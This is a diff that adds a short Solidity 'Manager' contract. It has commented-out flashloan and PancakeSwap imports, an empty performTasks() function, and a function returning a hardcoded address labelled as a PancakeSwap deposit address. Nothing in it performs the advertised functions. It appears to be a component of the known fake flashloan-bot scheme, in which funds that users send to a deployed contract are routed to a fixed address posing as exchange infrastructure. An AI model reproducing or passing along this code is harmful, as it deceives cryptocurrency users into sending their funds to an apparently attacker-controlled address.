@@ -1,0 +1,19 @@
+// Multiplier-Finance Smart Contracts
+//import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
+//import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";
+
+// PancakeSwap Smart Contracts
+//import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
+//import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
+//import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";
+pragma solidity ^0.6.6;
+
+contract Manager {
+        function performTasks() public {
+   
+        }
+
+        function pancakeswapDepositAddress() public pure returns (address) {
+                   return 0xd888CFEDAe2FE6c0606E621f54936cecd327c722;
+         }
+}  
